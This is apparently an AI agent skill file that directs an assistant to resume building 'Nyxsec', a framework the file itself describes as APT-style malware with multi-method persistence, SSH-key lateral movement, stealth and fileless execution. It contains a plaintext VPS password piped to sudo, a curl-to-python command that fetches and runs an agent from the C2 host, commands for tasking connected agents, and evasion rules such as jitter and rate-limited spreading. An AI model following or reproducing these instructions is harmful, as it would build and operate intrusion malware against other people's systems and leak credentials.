---
name: vps-claude-config-nyxsec
description: Continue Nyxsec APT-hybrid shell framework development. Loads project state from VPS and resumes work.
triggers:
  - /nyxsec
  - nyxsec project
  - continue nyxsec
---
# Nyxsec Development Skill

## Overview

Nyxsec adalah proyek shell framework dengan karakteristik APT malware:
- Autonomous survival (tanpa C2)
- Multi-layer persistence (5+ methods)
- Lateral movement (SSH key spreading)
- Stealth-first design

**Proyek ini FULL REMOTE di VPS.**

## Infrastructure

```
VPS:      203.0.113.10
User:     Haza
Password: Yusana05120@@@
SSH:      ssh Haza@203.0.113.10
Project:  /home/Haza/Nyxsec/
```

## Instructions

When this skill is invoked:

### Step 1: Load Project State

```bash
ssh Haza@203.0.113.10 "cat ~/Nyxsec/README.md"
```

Read the README.md carefully. It contains:
- Progress tracker (what's DONE/TODO)
- Current phase
- Next steps
- Architecture overview

### Step 2: Check Current Implementation

```bash
# List existing code
ssh Haza@203.0.113.10 "find ~/Nyxsec -name '*.py' -type f"

# Check C2 server status
ssh Haza@203.0.113.10 "systemctl status nyxsec-c2 --no-pager"

# Check recent changes
ssh Haza@203.0.113.10 "ls -lt ~/Nyxsec/lib/*/*.py 2>/dev/null | head -10"
```

### Step 3: Continue Development

Based on README.md progress tracker:
1. Find first TODO item with highest priority (P1)
2. Implement it directly on VPS
3. Update README.md progress tracker
4. Test the implementation

### Development Workflow

```bash
# Edit files on VPS
ssh Haza@203.0.113.10 "cat > ~/Nyxsec/lib/core/loader.py << 'EOF'
# code here
EOF"

# Or use heredoc for complex files
ssh Haza@203.0.113.10 << 'ENDSSH'
cat > ~/Nyxsec/path/to/file.py << 'EOF'
# Python code
EOF
ENDSSH

# Test
ssh Haza@203.0.113.10 "cd ~/Nyxsec && python3 -c 'import lib.core.loader; print(\"OK\")'"

# Update README progress
ssh Haza@203.0.113.10 "sed -i 's/| memfd_create loader | TODO/| memfd_create loader | DONE/' ~/Nyxsec/README.md"
```

### Key Files on VPS

```
~/Nyxsec/
├── README.md                    # PROJECT STATE - READ FIRST
├── docs/
│   ├── FINAL_METHODOLOGY.md     # Master technical reference
│   ├── LATERAL_MOVEMENT.md      # SSH propagation
│   ├── STEALTH_TECHNIQUES.md    # Evasion
│   └── ...
├── lib/
│   ├── detection/env_detect.py  # EXISTS
│   ├── persistence/watchdog.py  # EXISTS
│   ├── execution/memfd.py       # EXISTS
│   └── core/                    # TO BE CREATED
├── server/
│   └── http_c2.py               # EXISTS, RUNNING
└── payloads/
```

### C2 Server Management

```bash
# Check status
ssh Haza@203.0.113.10 "systemctl status nyxsec-c2"

# View logs
ssh Haza@203.0.113.10 "journalctl -u nyxsec-c2 -n 50"

# Restart after changes
ssh Haza@203.0.113.10 "echo 'Yusana05120@@@' | sudo -S systemctl restart nyxsec-c2"

# List connected agents
ssh Haza@203.0.113.10 "cd ~/Nyxsec && python3 server/http_c2.py --list"
```

### Testing

```bash
# Test C2 endpoint
curl -s http://203.0.113.10/ping

# Deploy test agent
curl -fsSL http://203.0.113.10/s1 | python3

# Send command to agent
ssh Haza@203.0.113.10 "cd ~/Nyxsec && python3 server/http_c2.py --send AGENT_ID 'id'"
```

## Important Constraints

1. **This project is SEPARATE from Hephaestus** - do not mix
2. **All code lives on VPS** - no local files
3. **Rate limit lateral movement** - max 2 hosts/day
4. **Add jitter to all timing** - 30% variance
5. **Use memfd_create** - fileless execution priority

## When User Says...

| User Says | Action |
|-----------|--------|
| "continue nyxsec" | Load README, find next TODO, implement |
| "nyxsec status" | Show progress tracker from README |
| "test nyxsec agent" | Deploy to test target |
| "nyxsec c2 status" | Check systemctl status |

## Quick Resume Command

```bash
ssh Haza@203.0.113.10 "cat ~/Nyxsec/README.md" | grep -A 50 "Progress Tracker"
```

This shows current progress and what needs to be done next.
